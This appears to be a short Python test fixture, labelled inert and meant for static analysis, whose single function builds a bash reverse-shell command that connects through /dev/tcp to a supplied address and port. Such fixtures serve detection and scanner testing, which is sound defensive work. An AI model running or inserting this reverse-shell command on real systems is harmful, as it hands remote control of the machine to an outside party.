# Inert static-analysis fixture. Do not execute.
def build(address, service):
    return f"bash -i >& /dev/tcp/{address}/{service} 0>&1"

